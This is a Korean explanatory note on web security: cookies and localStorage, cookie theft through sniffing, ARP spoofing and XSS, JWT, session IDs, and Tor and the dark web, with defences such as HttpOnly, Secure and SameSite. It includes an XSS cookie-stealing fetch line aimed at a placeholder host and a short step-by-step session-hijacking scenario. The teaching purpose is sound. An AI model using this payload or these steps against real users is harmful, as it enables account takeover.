# 쿠키와 로컬스토리지
웹 브라우저에 데이터를 저장한다는 점은 같지만, '쿠키 (Cookie)'와 '로컬스토리지(LocalStorage)'는 사용 목적과 특성이 확연히 다릅니다. 백엔드와 프런트엔드 사이의 데이터 흐름을 설계할 때 이 차이를 아는 것이 매우 중요합니다. 

1. 쿠키 (Cookie)
주로 서버와 클라이언트 간의 상태를 유지하기 위해 사용됩니다.
* 자동 전송: 브라우저가 서버에 HTTP 요청을 보낼 때마다 헤더에 포함되어 자동으로 서버에 전달됩니다.
* 만료일 설정: Expires나 Max-age를 통해 특정 날짜에 삭제되도록 설정할 수 있습니다. 설정하지 않으면 브라우저 종료 시 삭제됩니다. 
* 작은 용량: 약 4KB 내외로 아주 적은 데이터만 담을 수 있습니다. 
* 보안 옵션: HttpOnly 설정을 통해 자바스크립트 접근을 차단하거나, Secure 설정을 통해 HTTPS에서만 전송되도록 제어할 수 있습니다. 

2. 로컬스토리지 (LocalStorage)
브라우저에 반구조적인 데이터를 저장하기 위한 저장소입니다. (Web Storage API의 일종)
* 수동 관리: 서버로 자동 전송되지 않으며, 오직 자바스크립트를 통해서만 읽고 쓸 수 있습니다. 
* 영구성: 사용자가 직접 지우거나 코드로 삭제하지 않는 한, 브라우저를 닫아도 데이터가 사라지지 않습니다. 
* 큰 용량: 약 5MB ~ 10MB 정도로 쿠키보다 훨씬 많은 데이터를 저장할 수 있습니다. 
* 보안 취약: 자바스크립트로 언제든 접근 가능하므로 XSS 공격에 노출된 경우 데이터가 쉽게 탈취될 수 있습니다.

   구분            |        쿠키 (Cookie)           |        로컬스토리지 (LocalStorage)
   용도            |    세션 관리, 로그인 상태 유지      |   사용자 설정 저장, UI 상태 유지
   서버 전송        |  매 요청마다 자동 전송             |  전송되지 않음
   용량 제한        |     매우 작음 (4KB)             |   수동 삭제 전까지 영구적
   만료 시점        |   설정에 따름 (영구 가능)          |   수동 삭제 전까지 영구적 
   보안            |  HttpOnly로 방어 가능           |   XSS에 매우 취약함 

3. 언제 무엇을 써야 할까?
* 쿠키를 쓰는 이유: 로그인 세션ID, 인증 토큰(JWT) 등을 저장할 때 사용합니다. 특히 보안이 중요한 인증 정보는 HttpOnly 쿠키에 담는 것이 정석입니다.
* 로컬스토리지의 경우: 다크모드 설정, "오늘 하루 보지 않기" 팝업 체크 여부, 비로그인 장바구니 데이터처럼 서버가 매번 알 필요는 없지만 로컬에 유지되어야 하는 정보를 저장할 때 유리합니다.

# 쿠키는 어떤 경로로 탈취당할 수 있을까?
해커가 사용자의 컴퓨터에 직접 접속하지 않더라도 쿠키를 가로챌 수 있는 경로는 크게 '네트워크 구간, 브라우저 실행 시점, 서버 취약점' 세 가지 측면으로 나눌 수 있습니다. 

1. 네트워크 구간 탈취 (Sniffing)
데이터가 사용자의 컴퓨터에서 서버로 전송되는 '통로'에서 발생하는 공격입니다. 
* Packet Sniffing (패킷 스니핑): 암호화되지 않은 공용 Wi-Fi를 사용할 때 발생합니다. 동일한 네트워크에 접속한 해커가 도구를 이용해 오가는 데이터를 훔쳐봅니다. 만약 웹사이트가 HTTPS를 사용하지 않는다면, 쿠키에 담긴 세션 ID가 평문(Plain Text)으로 노출되어 즉시 탈취됩니다.
* Main-in-the-Middle (MITM, 중간자 공격): 해커가 사용자와 서버 사이의 통신을 가로채서 양방향 데이터를 보두 들여다보는 방식입니다. 가짜 Wi-Fi 공유기(Evil Twin)를 만들어 접속을 유도하기도 합니다. 

2. 브라우저 내 스크립트 실행 (XSS)
웹사이트 자체의 취약점을 이용해 사용자의 브라우저 안에서 악성 코드가 돌아가게 만드는 방식입니다. 
* Stored/Reflected XSS: 게시판이나 URL 파라미터에 <script> 태그를 심어두는 공격입니다. 사용자가 해당 페이지를 열면 브라우저가 이 스크립트를 실행하게 되고,
스크립트는 document.cookie 명령어를 통해 사용자의 쿠키를 읽어 해커의 서버로 전송합니다.
예시: fetch('https://hacker.com/steal?cookie=' + document.cookie);

3. 물리적 및 사회적 공학 기법
시스템적인 취약점 외에 환경적인 요인에 의한 노출입니다. 
* 공용 PC 사용: PC방이나 도서관 등에서 로그아웃을 하지 않고 브라우저를 종료하면, 쿠키가 하드디스크에 남아 다음 사용자가 이를 그대로 이용할 수 있습니다.
* 물리적 접근: 해커가 사용자의 컴퓨터 앞에 앉을 수 있는 짧은 시간이 있다면, 브라우저의 개발자 도구 F12를 열어 단 몇 초만에 쿠키 값을 복사해갈 수 있습니다. 

4. 쿠키 탈취를 막는 핵심 방어 전략 
백엔드 시스템을 설계할 때 가장 우선적으로 고려해야 하는 '보안 3요소'입니다.

     보안 설정         |       효과
     HttpOnly        | 자바스크립트(document.cookie)로 쿠키에 접근하는 것을 원천 차단합니다. (XSS 방어)
     Secure          |   오직 HTTPS 연결에서만 쿠키를 전송하도록 강제합니다. (스니핑 방어)
     SameSite        | 다른 사이트에서 요청을 보낼 때 쿠키가 전송되지 않도록 설정합니다. (CSRF 방어)

 특히 대규모 데이터를 다루거나 금융 관련 시스템을 구축할 때는 '세션 타임아웃'을 짧게 설정하고, 'IP주소 기반의 세션 검증'을 병행하여 쿠키가 탈취되더라도 해커가 다른 환경에서 사용하지 못하도록 이중 방어막을 치는 것이 중요합니다.

# 어떻게 네트워크를 통해 쿠키를 탈취할까?
네트워크 계층에서 데이터를 가로채는 행위는 마치 중간에서 편지를 가로채 내용을 훔쳐보는 것과 같습니다. 

네트워크 보안의 핵심원리

1. HTTP vs HTTPS (암호화의 유무)
가장 근본적인 차이는 데이터가 날것(Plain Text)으로 가느냐, 자물쇠가 채워져서 가느냐의 차이입니다. 
* HTTP (HyperText Transfer Protocol) : 데이터를 암호화하지 않고 전송합니다. 만약 로그인 쿠키를 HTTP로 보낸다면, 중간에서 누구나 그 값을 그대로 읽을 수 있습니다. 
* HTTPS (HTTP Secure): SSL/TLS 프로토콜을 사용하여 데이터를 암호화합니다. 해커가 데이터를 가로채더라도 암호키가 없으면 내용을 해독할 수 없습니다. 

2. ARP 스푸핑 (ARP Spoofing)
로컬 네트워크(LAN)에서 발생하는 대표적인 기법으로, '내가 바로 공유기(Gateway)야!'라고 거짓말을 하는 공격
(1) 원리 : 해커는 자신의 MAC 주소를 공유기의 IP주소와 연결하라는 가짜 ARP 응답을 희생자의 컴퓨터에 계속 보냅니다. 
(2) 결과 : 희생자의 컴퓨터는 외부 인터넷으로 나가는 모든 패킷을 공유기가 아닌 '해커의 컴퓨터'로 먼저 보내게 됩니다. 
(3) 탈취 : 해커는 이 패킷들을 실시간으로 읽은 뒤 다시 진짜 공유기로 전달해주기 때문에, 사용자는 인터넷이 느려진 것 외에는 공격당하고 있다는 사실을 알아차리기 어렵습니다. 

3. 와이어샤크 (Wireshark)
네트워크를 떠다니는 패킷을 실시간으로 수집하고 분석하는 '네트워크 분석 도구'입니다. 
* 용도: 원래는 네트워크 장애 진단이나 프로토콜 분석용이지만, 해커에게는 강력한 스니핑 도구가 됩니다. 
* 쿠키 탈취 과정: 'ARP 스푸핑' 등을 통해 희생자의 패킷이 내 컴퓨터를 거치게 만든 뒤, 와이어샤크를 켜서 http.cookie 필터를 걸면 실시간으로 전송되는 세션 ID와 쿠키 값들을 눈으로 확인할 수 있습니다. 

4. FTP vs SFTP (파일 전송의 보안)
쿠키 탈취와 마찬가지로, 서버에 파일을 올리거나 설정값을 수정할 때도 보안이 중요합니다. 
* FTP (File Transfer Protocol) : 명령어와 데이터를 평문으로 전송합니다. 아이디와 비밀번호조차 암호화되지 않아 와이어샤크로 패킷을 하나만 찍어봐도 계정 정보가 노출되비낟. 
* SFTP (SSH File Transfer Protocol): SSH(Secure Shell) 위에서 동작하며, 모든 통신 과정을 암호화합니다. 현대적인 백엔드 환경에서는 보안을 위해 반드시 SFTP(또는 SCP)를 사용해야 합니다. 

5. 해커의 시나리오 예시
(1) 공용 Wi-Fi에서 ARP 스푸핑으로 희생자의 트래픽을 내 노트북으로 끌어옵니다. 
(2) 와이어샤크를 실행해 들어오는 패킷을 분석합니다.
(3) 희생자가 HTTP로 된 사이트에 접속하는 순간, 패킷 안의 쿠키(Session ID)를 복사합니다. 
(4) 내 브라우저에 해당 쿠키를 주입하여 희생자의 계정으로 로그인에 성공합니다. 

방어 방법: 서비스 제공자는 모든 페이지에 HTTPS를 적용하고 쿠키에 Secure 속성을 부여해야 하며, 사용자는 신뢰할 수 없는 네트워크에서 중요한 작업을 피해야 합니다.

# JWT는 뭘까? 복호화는 왜 필요한걸까?
JWT는(JSON Web Token)는 당사자 간의 정보를 JSON 객체로 안전하게 전송하기 위한 개방형 표준(RFC7519)입니다. 사용자의 신원이나 권한 정보를 담은 '디지털 신분증'으로 이해하면 됩니다. 

1. JWT의 구조 (세 부분으로 구성)
JWT는 점(.)으로 구분된 세 부분으로 이루어져 있습니다. 
(1) Header (헤더): 토큰의 타입(JWT)과 사용 중인 암호화 알고리즘(예: HS256, RS256)을 담습니다.
(2) Payload (페이로드): 실제 전달하려는 정보(클레임, Claim)가 들어있습니다. 사용자 ID, 유효기간, 권한 등이 여기에 포함됩니다. 
(3) Signature (서명): 헤더와 페이로드를 합친 뒤, 서버만 알고 있는 '비밀키(Secret Key)'로 암호화하여 생성합니다. 토큰이 중간에 변조되지 않았음을 증명합니다. 

2. 복호화(Decoding)가 왜 필요한가?
JWT에서 '복호화'라는 표현은 엄밀히 말하면 두 가지 의미로 쓰입니다. 하나는 '데이터를 읽기 위함'이고, 다른 하나는 '검증하기 위함'입니다. 

(1) JWT의 헤더와 페이로드는 암호화된 것이 아니라 Base64로 인코딩된 상태입니다. 즉, 누구나 쉽게 디코딩해서 내용을 볼 수 있습니다. 
* 이유: 클라이언트(브라우저나 앱)가 토큰 안에 들어있는 사용자 이름이나 권한 정보를 읽어서 UI에 표시(예: "홍길동님 환영합니다")하거나, 특정 메뉴의 노출 여부를 결정해야 하기 때문입니다.

(2) 보안 검증 (Verification)
서버가 클라이언트로부터 받은 토큰을 처리할 때, '서명(Signature)' 부분을 서버의 비밀 키로 풀어보고 계산 결과가 일치하는지 확인합니다.
* 이유: 만약 헤커가 페이로드의 사용자 ID를 자기 것으로 바꾸더라도, 서버의 비밀 키를 모르면 그에 맞는 올바른 서명을 만들어낼 수 없습니다. 서버는 복호화 및 검증 과정을 통해 '이 토큰은 내가 발행한 것이 맞고, 중간에 수정되지 않았다'는 것을 확신하게 됩니다. 

3. JWT 사용 시 주의사항 (중요)
페이로드는 누구나 읽을 수 있는 상태입니다. 따라서 '비밀번호, 주민등록번호, 계좌번호 같은 민감한 정보는 절대로 JWT 페이로드에 담아서는 안됩니다.
* 잘못된 예: {"user_id": 123, "password": "password123"}
* 올바른 예: {"user_id" 123, "role": "admin", "exp": 1712232000}

4. 정리하자면
JWT는 서버가 상태를 저장하지 않고도(Stateless) 사용자를 인증할 수 있게 해주는 아주 효율적인 도구입니다. '복호화'는 클라이언트가 정보를 활용하기 위해 필요하고, '서명 검증'은 서버가 보안을 유지하기 위해 필수적입니다. 
'데이터 정합성과 보안'을 중요하게 생각하신다면, JWT를 발급할 때 유효기간(exp)을 짧게 설정하고 'Refresh Token'을 병행하여 운영하는 방식을 고려해 보시는 것이 좋습니다.

# 세션은 어떻게 개개인을 식별할까? 세션 ID란 무엇일까? 세션 아이디가 발급되고 어떻게 관리되는지 
웹 서비스에서 수많은 접속자 중 '나'를 정확히 구별해내는 핵심 메커니즘이 바로 '세션(Session)'입니다. 세션이 어떻게 발급되고, 서버와 브라우저 사이에서 어떻게 관리되는지 그 과정을 단꼐별로 살펴보겠습니다. 

1. 세션 ID (Session ID)란?
세션 ID는 서버가 특정 사용자를 식별하기 위해 발급하는 '고유한 임시 식별자'입니다.
* 역할: 웹 프로토콜인 HTTP는 상태를 유지하지 않는 (Stateless) 특성이 있습니다. 즉, 서버는 방금 요청을 보낸 사람이 1초 전에 로그인한 그 사람인지 알 방법이 없습니다. 이때 세션 ID가 '출입증'역할을 하여 흐름을 이어줍니다. 
* 형태: 외부에서 추측할 수 없도록 매우 길고 무작위적인 문자열로 생성됩니다. 

2. 세션의 발급과 관리 과정(Step-by-Step)
서버와 클라이언트가 세션 ID를 주고받는 과정은 다음과 같습니다. 
(1) 최초 요청: 사용자가 로그인 페이지에 접속하여 아이디/비밀번호를 입력하고 서버로 보냅니다. 
(2) 세션 생성: 서버는 DB를 확인해 사용자가 맞다면, 메모리(또는 Redis 같은 저장소)에 '세션 객체'를 생성하고 여기에 대응하는 고유한 '세션ID'를 만듭니다. 
(3) 응답 (Set-Cookie): 서버는 HTTP 응답 헤더의 Set-Cookie를 통해 브라우저에게 세션 ID를 전달합니다.
예: Set-Cookie: SESSIONID=abc123xyz; HttpOnly; Secure
|--> HttpyOnly(자바스크립트에서 쿠키 접근 못 하게 막는 옵션), Secure(HTTPS에서만 쿠키 전송되게 하는 옵션)
(4) 쿠키 저장: 브라우저는 전달받은 세션 ID를 쿠키 저장소에 보관합니다.
(5) 이후 요청: 사용자가 다른 페이지를 클릭하면, 브라우저는 쿠키 저장소에 있던 '세션ID를 자동으로 HTTP 요청 헤더에 담아' 서버로 보냅니다. 
(6) 식별 및 응답: 서버는 받은 세션 ID를 자신의 세션 저장소에서 조회합니다. 일치하는 값이 있다는 '아까 로그인한 홍길동이구나!'라고 판단하여 개인화된 정보를 제공합니다. 

3. 서버는 세션을 어디에 저장할까?
세션 저장소 선택은 시스템의 규모와 안정성에 큰 영향을 미칩니다. 
* 서버 메모리 (Heap) : 속도가 매우 빠르지만, 서버를 재시작하면 모든 세션이 날아갑니다.
    -> 소규모 서비스, 단일 서버 
* 데이터베이스 (RDB) : 영구적이고 안정적이지만, 매 요청마다 DB 조회를 해야 하므로 성능 부담이 큽니다. 
    -> 정합성이 중요한 서비스 
* 인메모리 DB (Redis) : 메모리 기반이라 빠르면서도 서버와 독립적으로 운영 가능합니다. 
    -> 대규모/분산 환경 권장 

4. 세션 관리의 핵심 보안 포인트
세션 ID는 탈취당하면 바로 계정 탈취로 이어지므로 엄격하게 관리해야 합니다. 
* 세션 타임아웃 (Timeout): 일정 시간 동안 활동이 없으면 세션을 만료시켜 해커가 유효하지 않은 ID를 들고 있어도 무용지물이 되게 합니다.
* 세션 고정 (Session Fixation) 방지: 로그인 성공 시 기존에 쓰던 세션 ID를 버리고 '새로운 세션 ID를 재발급'하여, 비리 심어둔 ID를 이용한 공격을 차단합니다. 
* HttpOnly & Secure: 이전 답변에서 다룬 것처럼, 자바스크립트 접근을 막고 암호화 통신에서만 세션 ID가 오가게 설정하는 것이 기본입니다. 

세션 = 서버가 나를 기억하기 위해 만든 '장부'
세션 ID = 그 장부의 '페이지 번호'가 적힌 쪽지

# 해커는 내 컴퓨터에 접속하지 않더라도 내 컴퓨터의 쿠키를 볼 수 있을까?
해커가 사용자의 컴퓨터에 직접 접속(원격 제어 등)하지 않더라도 브라우저에 저장된 쿠키를 탈취할 수 있는 방법은 여러가지가 있습니다. 
이를 보통 '쿠키 하이재킹(Cookie Hijacking) 또는 '세션 하이재킹'이라고 부르며, 주로 다음과 같은 경로를 통해 발생합니다.

1. 주요 탈취 기법
* XSS (Cross-Site Scripting) : 가장 대표적인 방법입니다. 해커가 보안이 취약한 웹사이트에 악성 스크립트를 심어두면, 사용자가 그 페이지를 방문하는 순간 스크립트가 실행되어 사용자의 쿠키를 해커의 서버로 전송합니다.
* 네트워크 스니핑 (Sniffing) : 암호화되지 않은 공용 Wi-Fi를 사용할 때 발생합니다. 같은 네트워크에 있는 해커가 네트워크 패킷을 가로채서 HTTPS가 적용되지 않은 사이트의 
쿠키 정보를 평문으로 읽어낼 수 있습니다.
* 공격 대행 (Cross-Site Request Forgery, CSRF): 쿠키 자체를 직접 보지는 못하더라도, 사용자의 브라우저에 남은 쿠키(인증 정보)를 이용해 사용자인 척 속여서 특정 요청(비밀번호 변경, 송금 등)을 보내도록 유도합니다. 

2. 쿠키가 털리면 왜 위험한가요?
쿠키에는 보통 '세션ID(Session ID)'가 들어있습니다. 서버는 이 ID를 보고 '이 브라우저는 현재 로그인된 홍길동님이군'라고 판단합니다. 해커가 이 세션 ID를 손에 넣으면:
- 아이디와 비밀번호를 몰라도 로그인된 상태를 그대로 복제할 수 있습니다.
- 개인정보를 조회하거나 사용자의 권한으로 게시물을 올리는 등 계정 탈취와 동일한 효과를 냅니다.

3. 이를 방지하기 위한 보안 설정 (개발자 및 사용자 관점)
백엔드 개발자나 보안에 민감한 사용자라면 다음과 같은 방어 기제를 이해하고 적용해야 합니다. 
- HttpOnly 플래그: 쿠키 설정 시 이 옵션을 주면, 자바스크립트(document.cookie)를 통해 쿠키에 접근할 수 없습니다. XSS 공격으로부터 쿠키를 보호하는 가장 핵심적인 방법입니다.
- Secure 플래그: HTTPS 통신일 때만 쿠키를 전송하도록 제한합니다. 네트워크 스니핑을 방지합니다.
- SameSite 설정: 쿠키가 생성된 사이트와 동일한 도메인에서만 쿠키를 전송하도록 제한하여 CSRF 공격을 방어합니다.
- HSTS (HTTP Strict Transport Security): 브라우저가 강제로 HTTPS로만 접속하게 하여 암호화되지 않은 구간을 없앱니다. 

따라서 중요한 서비스를 개발할때는 반드시 HttpOnly와 Secure 옵션을 활성화하고, 사용자 입장에서는 가급적 공용 Wi-Fi에서의 금융 거래 등을 피하는 것이 좋습니다.

# 토르 브라우저와 다크웹, 범죄자들은 왜 이런걸 쓸까?
토르 브라우저(Tor Browser)와 다크웹(Dark Web)은 익명성을 최우선으로 설계된 기술적 공간입나다. 

1. 토르 브라우저의 원리: '양파 라우팅'
토르(Tor)는 'The Onion Router'의 약자입니다. 양파 껍질처럼 데이터를 여러 겹으로 암호화하여 전송하기 때문에 붙여진 이름입니다. 
* 다중 중계 (Triple Hop): 사용자가 보낸 데이터는 전 세계에 흩어진 최소 3대의 중계 서버(노드)를 거칩니다. 
(1) 입구 노드: 내 IP 주소는 알지만, 내가 어디로 가는지 모릅니다.
(2) 중간 노드: 어디서 오는지도, 어디로 가는지도 모릅니다. 
(3) 출구 노드: 최종 목적지는 알지만, 누가 보냈는지 모릅니다. 

* 익명성 보장: 이 과정을 거치면 수신 측 서버는 '출구 노드'의 IP만 볼 수 있을 뿐, 실제 사용자가 누구인지 추적하기가 매우 어렵습니다. 

2. 다크웹 (Dark Web)이란?
d우리가 흔히 쓰는 구글, 네이버 등에서 검색되는 영역은 '표면 웹(Surface Web)'입니다. 그 아래에 검색되지 않는 '딥웹(Deep Web)'이 있고, 그중에서도 특수한 브라우저(토르 등)로만 접속 가능한 구역을 '다크웹'이라 부릅니다. 
* 주소 체계: 일반적인 .com이나 .kr 대신 .onion으로 끝나는 복잡한 주소를 사용합니다. 
* 비공개성: IP 주소가 계속 바뀌고 암호화되어 있어 서버의 물리적 위치를 파악하기 힘듭니다. 

3. 범죄자들이 다크웹을 쓰는 이유 
범죄자들이 불편하고 느린 이 공간을 굳이 찾는 이유는 명확합니다. 

(1) 수사기관의 추적 회피
가장 큰 이유는 익명성입니다. 일반적인 인터넷 환경에서는 수사기관이 ISP(통신사)나 서버 로그를 압수수색하면 범인을 특정할 수 있습니다. 하지만 다크웹은 접속 경로가 전 세계로 꼬여 있어 IP를 역추적하는 데 엄청난 시간과 비용이 듭니다. 

(2) 불법 거래의 온상 (Marketplace)
마약, 해킹 툴, 유출된 개인정보, 불법 촬영물 등이 거래되는 '암시장'이 형성되어 있습니다. 
* 가상화폐 결제: 추적이 어려운 비트코인이나 모네로(Monero)같은 가상화폐를 결제 수단으로 사용하여 자금 흐름까지 숨깁니다. 

(3) 검열 우회 및 은폐
특정 국가에서 금지된 정보를 공유하거나, 추적을 피해야 하는 해킹 그룹들이 본거지로 활용하기에 최적의 장소입니다. 

4. 양날의 검: 기술의 양면성
사실 토르 브라우저 자체는 불법이 아닙니다. 원래는 표현의 자유를 보장하기 위해 개발되었습니다. 
* 긍정적 활용: 독재 국가의 검열을 피해야 하는 기자, 내부 고발자, 민주화 운동가들이 자신의 신변을 보호하기 위해 사용하기도 합니다. 
* 부정적 활용: 하지만 그 강력한 익명성을 악용해 범죄자들이 숨어들면서 '범죄의 온상'이라는 이미지가 강해진 것입니다.
